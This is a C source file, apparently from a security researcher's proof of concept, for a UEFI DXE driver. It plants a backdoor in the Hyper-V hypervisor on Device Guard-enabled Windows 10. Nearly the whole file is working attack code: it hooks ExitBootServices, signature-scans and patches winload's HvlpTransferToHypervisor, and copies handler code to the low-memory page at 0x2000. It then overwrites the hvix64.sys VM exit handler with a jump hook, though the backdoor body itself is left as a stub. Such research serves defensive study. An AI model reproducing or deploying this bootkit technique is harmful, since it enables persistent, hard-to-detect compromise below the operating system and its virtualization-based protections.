/*
 *********************************************************************
 
  Part of UEFI DXE driver code that injects Hyper-V VM exit handler
  backdoor into the Device Guard enabled Windows 10 Enterprise.
   
  Execution starts from new_ExitBootServices() -- a hook handler 
  for EFI_BOOT_SERVICES.ExitBootServices() which being called by
  winload!OslFwpKernelSetupPhase1(). After DXE phase exit winload.efi
  transfers exeution to previously loaded Hyper-V kernel (hvix64.sys)
  by calling winload!HvlpTransferToHypervisor().
   
  To transfer execution to Hyper-V winload.efi uses a special stub
  winload!HvlpLowMemoryStub() copied to reserved memory page at constant
  address 0x2000. During runtime phase this memory page is visible to
  hypervisor core at the same virtual and physical address and has 
  executable permissions which makes it a perfect place to store our 
  Hyper-V backdoor code.
   
  VMExitHandler() is a hook handler for VM exit function of hypervisor 
  core, it might be used for interaction between hypervisor backdoor and
  guest virtual machines.
   
  @d_olex
 
 *********************************************************************
 */
 
#define JUMP32_LEN 5
 
// jmp/call: destination from operand
#define JUMP32_ADDR(_addr_) ((UINTN)(_addr_) + *(INT32 *)((UINT8 *)(_addr_) + 1) + JUMP32_LEN)
 
// jmp/call: destination to operand
#define JUMP32_OP(_from_, _to_) ((UINT32)((UINTN)(_to_) - (UINTN)(_from_) - JUMP32_LEN))
 
#define WINLOAD_HOOK_SIZE JUMP32_LEN
#define WINLOAD_HOOK_BUFF WINLOAD_HOOK_SIZE * 2
 
// constant value of winload!HvlpBelow1MbPage
#define BELOW_1MB_PAGE_ADDR 0x2000
 
#define VM_EXIT_HANDLER_OLD  (BELOW_1MB_PAGE_ADDR + 0x800)
#define VM_EXIT_HANDLER_CODE (BELOW_1MB_PAGE_ADDR + 0x880)
 
#define VM_EXIT_HOOK_SIZE 13
 
// structure to keep execution environment information after Hyper-V load
typedef struct _HV_INFO
{
    UINT64 Success;
    UINT64 WinloadPageTable;
    UINT64 HvPageTable;
    UINT64 HvEntry;
    UINT64 HvVmExit;
 
} HV_INFO,
*PHV_INFO;
//--------------------------------------------------------------------------------------
/*
    Guest state saved by VM exit handler of hvix64.sys:
 
        .text:FFFFF8000023A11E      mov     [rsp+arg_20], rcx
        .text:FFFFF8000023A123      xor     ecx, ecx
        .text:FFFFF8000023A125      mov     [rsp+arg_28], rcx
        .text:FFFFF8000023A12A      mov     rcx, [rsp+arg_18]
        .text:FFFFF8000023A12F      mov     [rcx], rax
        .text:FFFFF8000023A132      mov     [rcx+8], rcx
        .text:FFFFF8000023A136      mov     [rcx+10h], rdx
        .text:FFFFF8000023A13A      mov     [rcx+18h], rbx
        .text:FFFFF8000023A13E      mov     [rcx+28h], rbp
        .text:FFFFF8000023A142      mov     [rcx+30h], rsi
        .text:FFFFF8000023A146      mov     [rcx+38h], rdi
        .text:FFFFF8000023A14A      mov     [rcx+40h], r8
        .text:FFFFF8000023A14E      mov     [rcx+48h], r9
        .text:FFFFF8000023A152      mov     [rcx+50h], r10
        .text:FFFFF8000023A156      mov     [rcx+58h], r11
        .text:FFFFF8000023A15A      mov     [rcx+60h], r12
        .text:FFFFF8000023A15E      mov     [rcx+68h], r13
        .text:FFFFF8000023A162      mov     [rcx+70h], r14
        .text:FFFFF8000023A166      mov     [rcx+78h], r15
*/
typedef struct _VM_GUEST_STATE
{
    UINT64 Rax;
    UINT64 Rcx;
    UINT64 Rdx;
    UINT64 Rbx;
    UINT64 Rsp;
    UINT64 Rbp;
    UINT64 Rsi;
    UINT64 Rdi;
    UINT64 R8;
    UINT64 R9;
    UINT64 R10;
    UINT64 R11;
    UINT64 R12;
    UINT64 R13;
    UINT64 R14;
    UINT64 R15;
 
} VM_GUEST_STATE,
*PVM_GUEST_STATE;
 
typedef VOID (EFIAPI * func_VMExitHandler)(VM_GUEST_STATE *Context, UINT64 a2, UINT64 a3, UINT64 a4);
 
VOID VMExitHandler(VM_GUEST_STATE *Context, UINT64 a2, UINT64 a3, UINT64 a4)
{
    func_VMExitHandler old_VMExitHandler = (func_VMExitHandler)VM_EXIT_HANDLER_OLD;
 
    // ...
 
    old_VMExitHandler(Context, a2, a3, a4);
}
 
UINTN VMExitHandler_end(VOID) { }
 
VOID new_HvlpTransferToHypervisor(VOID *HvPageTable, VOID *HvEntry, VOID *HvlpLowMemoryStub)
{    
    HV_INFO *Info = (HV_INFO *)HV_INFO_ADDR;
    UINT64 PageTable = __readcr3();
    UINTN p = 0;
 
    Info->WinloadPageTable = PageTable;
    Info->HvPageTable = (UINT64)HvPageTable;
    Info->HvEntry = (UINT64)HvEntry;     
 
    while (p < 0x10000)
    {
        UINT8 *Func = (UINT8 *)HvEntry + p, m = 0;            
 
        __writecr3(HvPageTable);
 
        /*
            Match hvix64.sys VM exit handler code signature:
 
                .text:FFFFF8000023A11E      mov     [rsp+arg_20], rcx
                .text:FFFFF8000023A123      xor     ecx, ecx
                .text:FFFFF8000023A125      mov     [rsp+arg_28], rcx
                .text:FFFFF8000023A12A      mov     rcx, [rsp+arg_18]
                .text:FFFFF8000023A12F      mov     [rcx], rax
                .text:FFFFF8000023A132      mov     [rcx+8], rcx
 
                ...
 
                .text:FFFFF8000023A166      mov     [rcx+78h], r15
 
                ...
 
                .text:FFFFF8000023A1A4      call    _vmentry_handle
        */
        m = *(Func + 0x00) == 0x48 && *(Func + 0x01) == 0x89 && *(Func + 0x02) == 0x4c && *(Func + 0x03) == 0x24 &&
            *(Func + 0x11) == 0x48 && *(Func + 0x12) == 0x89 && *(Func + 0x13) == 0x01 && 
            *(Func + 0x14) == 0x48 && *(Func + 0x15) == 0x89 && *(Func + 0x16) == 0x49 && *(Func + 0x17) == 0x08 &&
            *(Func + 0x48) == 0x4c && *(Func + 0x49) == 0x89 && *(Func + 0x4a) == 0x79 && *(Func + 0x4b) == 0x78 &&
            *(Func + 0x86) == 0xe8;
 
        __writecr3(PageTable);
 
        if (m)
        {
            UINT8 *Buff = (UINT8 *)VM_EXIT_HANDLER_OLD;
            UINTN i = 0;
 
            __writecr3(HvPageTable);
 
            // get calee address
            Func = (UINT8 *)JUMP32_ADDR(Func + 0x86);
 
            __writecr3(PageTable);
 
            Info->HvVmExit = (UINT64)Func;
 
            /*
                Set up hook on hvix64.sys VM exit handler
            */
 
            for (i = 0; i < VM_EXIT_HOOK_SIZE; i += 1)
            {            
                __writecr3(HvPageTable);
 
                // save original bytes of VM exit handler
                *(Buff + i) = *(Func + i);
 
                __writecr3(PageTable);
            }
 
            // mov rax, addr
            *(UINT16 *)(Buff + VM_EXIT_HOOK_SIZE) = 0xb848;
            *(UINT64 *)(Buff + VM_EXIT_HOOK_SIZE + 2) = (UINT64)(Func + VM_EXIT_HOOK_SIZE);
 
            // jmp rax ; from callgate to function
            *(UINT16 *)(Buff + VM_EXIT_HOOK_SIZE + 10) = 0xe0ff;
 
            __writecr3(HvPageTable);
 
            // mov rax, addr
            *(UINT16 *)Func = 0xb848;
            *(UINT64 *)(Func + 2) = VM_EXIT_HANDLER_CODE;
 
            // jmp rax ; from function to callgate
            *(UINT16 *)(Func + 10) = 0xe0ff;
 
            __writecr3(PageTable);
 
            break;
        }
 
        p += 1;
    }
 
    Info->Success += 1;
}
 
UINTN new_HvlpTransferToHypervisor_end(VOID) { } 
//--------------------------------------------------------------------------------------
// original address of hooked function
EFI_EXIT_BOOT_SERVICES old_ExitBootServices = NULL;
 
// return address to ExitBootServices() caller
VOID *ret_ExitBootServices = NULL;
 
EFI_STATUS EFIAPI new_ExitBootServices(
    EFI_HANDLE ImageHandle,
    UINTN Key)
{    
    UINTN i = 0;
    EFI_IMAGE_NT_HEADERS *pHeaders = NULL;    
 
    // return address points to winload.efi
    VOID *Base = (VOID *)((UINTN)ret_ExitBootServices & 0xfffffffffffff000);
 
    DbgMsg(__FILE__, __LINE__, __FUNCTION__"(): ret = "FPTR"\r\n", ret_ExitBootServices);
 
    while (*(UINT16 *)Base != EFI_IMAGE_DOS_SIGNATURE)
    {
        Base = (VOID *)((UINTN)Base - PAGE_SIZE);
    }    
 
    DbgMsg(__FILE__, __LINE__, "winload.efi is at "FPTR"\r\n", Base);    
 
    pHeaders = (EFI_IMAGE_NT_HEADERS *)RVATOVA(Base, ((EFI_IMAGE_DOS_HEADER *)Base)->e_lfanew);
 
    for (i = 0; i < pHeaders->OptionalHeader.SizeOfImage; i += 1) 
    {
        UINT8 *Func = RVATOVA(Base, i);
 
        /*
            Match winload!HvlpTransferToHypervisor() code signature:
 
                .text:0000000140109270      push    rbx
                .text:0000000140109272      push    rbp
                .text:0000000140109273      push    rsi
                .text:0000000140109274      push    rdi
                .text:0000000140109275      push    r12
                .text:0000000140109277      push    r13
                .text:0000000140109279      push    r14
                .text:000000014010927B      push    r15
                .text:000000014010927D      mov     cs:HvlpSavedRsp, rsp
                .text:0000000140109284      jmp     r8
 
        */
        if (*(Func + 0x00) == 0x48 && *(Func + 0x01) == 0x53 && /* push rbx */
            *(Func + 0x02) == 0x55 && *(Func + 0x03) == 0x56 && /* push rbp && push rsi */
            *(Func + 0x0d) == 0x48 && *(Func + 0x0e) == 0x89 && *(Func + 0x0f) == 0x25 && /* mov HvlpSavedRsp, rsp */
            *(Func + 0x14) == 0x41 && *(Func + 0x15) == 0xff && *(Func + 0x16) == 0xe0) /* jmp r8 */
             
        {
            // hardcoded value
            VOID *HvlpBelow1MbPage = (VOID *)BELOW_1MB_PAGE_ADDR;
 
            // use HvlpBelow1MbPage + 0x10 to store hook handler code
            UINT8 *Buff = (UINT8 *)HvlpBelow1MbPage + 0x10;
            UINT8 *Handler = Buff + WINLOAD_HOOK_SIZE + (JUMP32_LEN * 2) + 8;
 
            DbgMsg(__FILE__, __LINE__, "winload!HvlpBelow1MbPage = "FPTR"\r\n", HvlpBelow1MbPage);
            DbgMsg(__FILE__, __LINE__, "winload!HvlpTransferToHypervisor = "FPTR"\r\n", Func);
 
            // copy VM exit handler code to HvlpBelow1MbPage
            m_BS->CopyMem(
                (VOID *)VM_EXIT_HANDLER_CODE, (VOID *)&VMExitHandler, 
                (UINTN)&VMExitHandler_end - (UINTN)&VMExitHandler
            );
 
            /*
                Set up hook on winload!HvlpTransferToHypervisor()
            */
 
            // copy HvlpTransferToHypervisor() handler code to HvlpBelow1MbPage
            m_BS->CopyMem(
                Handler, (VOID *)&new_HvlpTransferToHypervisor, 
                (UINTN)&new_HvlpTransferToHypervisor_end - (UINTN)&new_HvlpTransferToHypervisor
            );
 
            // push rcx / push rdx / push r8
            *(UINT32 *)Buff = 0x50415251;
 
            // call addr ; from callgate to handler            
            *(Buff + 4) = 0xe8;
            *(UINT32 *)(Buff + 5) = JUMP32_OP(Buff + 4, Handler);
 
            // pop r8 / pop rdx / pop rcx
            *(UINT32 *)(Buff + JUMP32_LEN + 4) = 0x595a5841;
 
            // save original bytes
            m_BS->CopyMem(Buff + JUMP32_LEN + 8, Func, WINLOAD_HOOK_SIZE);
 
            // jmp addr ; from callgate to function
            *(UINT8 *)(Buff + JUMP32_LEN + 8 + WINLOAD_HOOK_SIZE) = 0xe9;
            *(UINT32 *)(Buff + JUMP32_LEN + 8 + WINLOAD_HOOK_SIZE + 1) = \
                JUMP32_OP(Buff + JUMP32_LEN + 8 + WINLOAD_HOOK_SIZE, Func + WINLOAD_HOOK_SIZE);
 
            // jmp addr ; from function to callgate
            *Func = 0xe9;
            *(UINT32 *)(Func + 1) = JUMP32_OP(Func, Buff);            
 
            DbgMsg(
                __FILE__, __LINE__, 
                "winload!HvlpTransferToHypervisor() hook was set (handler = "FPTR")\r\n",
                Buff
            );
 
            goto _end;
        }
    }
 
    DbgMsg(__FILE__, __LINE__, "ERROR: Unable to locate winload!HvlpTransferToHypervisor()\r\n");
 
_end:
 
    // call original function
    return old_ExitBootServices(ImageHandle, Key);
}
//--------------------------------------------------------------------------------------